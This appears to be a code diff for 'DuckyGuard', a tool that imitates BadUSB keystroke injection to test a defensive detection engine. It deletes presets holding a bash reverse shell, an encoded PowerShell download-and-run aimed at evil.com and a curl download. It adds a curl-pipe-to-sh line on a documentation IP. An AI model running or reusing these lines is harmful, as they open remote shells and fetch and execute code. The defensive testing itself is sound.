@@ -1,66 +1,48 @@
 """
-DuckyGuard - Synthetic BadUSB Attack Simulator
-Simulates micro-controller keystroke injection (Flipper Zero / Rubber Ducky)
-at non-human velocities for live defense verification and demonstrations.
+DuckyGuard - safe injection simulator.
+
+Types a harmless payload through macOS's own event API (pynput Controller) at
+the timing of a scripted keyboard. The keys are *software* events (they carry
+this process's PID), so the engine only scores them while test mode is on;
+``Engine.begin_test()`` turns that on for a few seconds. Nothing in the
+payloads executes anything: they are plain sentences and a fake URL on a
+reserved documentation address (198.51.100.42, RFC 5737).
 """
+
+from __future__ import annotations
 
 import random
 import time
 from typing import Optional
-from pynput.keyboard import Controller, Key
+
+PRESETS = {
+    "harmless": "DuckyGuard safe test: curl -sL http://198.51.100.42/not-real.sh | sh (nothing runs)\n",
+    "plain": "this is a plain sentence typed at machine speed with no shell command in it\n",
+    "human": "The quick brown fox jumps over the lazy dog at a human pace.",
+}
 
 
 class BadUSBSimulator:
-    """
-    Injects synthetic keyboard events at variable typing profiles:
-    - Microcontroller BadUSB: 50-80 chars/second, ultra-low jitter (10-15ms interval)
-    - Benign Human: 5-8 chars/second, high jitter (120-240ms interval)
-    """
-
-    PRESETS = {
-        "resume_dropper": (
-            'curl -sL -o /tmp/test_resume.pdf "https://raw.githubusercontent.com/stevenhainley/Steves-LinkedIn-BadUSB/main/Steven_Hainley_Resume.pdf" && open /tmp/test_resume.pdf\n'
-        ),
-        "reverse_shell": (
-            'bash -i >& /dev/tcp/198.51.100.42/4444 0>&1\n'
-        ),
-        "powershell_enc": (
-            'powershell.exe -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==\n'
-        ),
-        "benign_human": (
-            'The quick brown fox jumps over the lazy dog and types at normal human typing speed.'
-        ),
-    }
+    """Replays a preset through pynput at injector or human timing."""
 
     def __init__(self):
+        from pynput.keyboard import Controller
         self.keyboard = Controller()
 
-    def run_simulation(
-        self,
-        preset_name: str = "resume_dropper",
-        custom_text: Optional[str] = None,
-        is_badusb: bool = True,
-        initial_countdown_sec: int = 3,
-    ):
-        """
-        Executes keystroke simulation after an optional countdown.
-        """
-        text = custom_text or self.PRESETS.get(preset_name, self.PRESETS["resume_dropper"])
-
-        print(f"\n[*] Preparing {'BadUSB Attack Injection' if is_badusb else 'Benign Human Typing'}...")
-        print(f"[*] Payload Preview: {text[:60]}...")
-        for i in range(initial_countdown_sec, 0, -1):
-            print(f"    Firing in {i}s... Focus any test area or leave active.")
-            time.sleep(1.0)
-        print("[!] FIRING INJECTION STREAM NOW!\n")
-
-        for char in text:
-            self.keyboard.type(char)
-            if is_badusb:
-                # Synthetic microcontroller timing: uniform 12ms delay (approx 83 chars/sec)
-                time.sleep(0.012)
-            else:
-                # Human typing timing: variable 100ms - 220ms delay with natural hesitation
+    def run(self, preset: str = "harmless", interval_ms: float = 12.0, human: bool = False,
+            countdown: float = 0.0, text: Optional[str] = None, on_done=None) -> None:
+        payload = text or PRESETS.get(preset, PRESETS["harmless"])
+        if countdown > 0:
+            time.sleep(countdown)
+        for ch in payload:
+            self.keyboard.type(ch)
+            if human:
                 time.sleep(random.uniform(0.10, 0.22))
+            else:
+                time.sleep(interval_ms / 1000.0)
+        if on_done:
+            on_done()
 
-        print("[✓] Simulation completed.\n")
+    # Backwards compatibility with the v1 CLI.
+    def run_simulation(self, preset_name="harmless", custom_text=None, is_badusb=True, initial_countdown_sec=3):
+        self.run(preset=preset_name, human=not is_badusb, countdown=initial_countdown_sec, text=custom_text)
